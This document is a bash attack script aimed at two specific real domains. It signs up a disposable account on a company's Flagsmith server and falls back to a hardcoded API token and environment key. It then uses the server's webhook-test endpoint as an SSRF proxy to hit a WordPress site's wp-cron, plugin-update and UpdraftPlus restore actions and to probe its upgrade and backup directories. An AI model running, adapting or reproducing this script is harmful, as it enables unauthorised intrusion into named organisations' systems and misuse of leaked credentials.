#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v22-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
  EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
  echo "Using fallback"
else
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v22"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
  echo "Env: $EKEY"
fi

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

# Test 1: Force update check via wp-cron with specific args
echo "=== FORCE UPDATE ==="
SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
echo ""

# Test 2: Try to directly trigger core update via admin-ajax
echo "=== TRIGGER UPDATE ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=update-plugin&plugin=hello.php&slug=hello-dolly"
echo ""

# Test 3: Check staging after trigger
echo "=== CHECK STAGING ==="
SSRF "https://koinp2p.com/wp-content/upgrade/"
echo ""

# Test 4: NEW — Check if koinp2p.com's wp-content is writable by testing UpdraftPlus dir creation
echo "=== UPDRAFT DIR CREATE ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=1&updraft_restore[]=plugins"
echo ""

# Test 5: Check if UpdraftPlus created log files (created during restore attempt)
echo "=== UPDRAFT LOGS ==="
SSRF "https://koinp2p.com/wp-content/updraft/"
echo ""
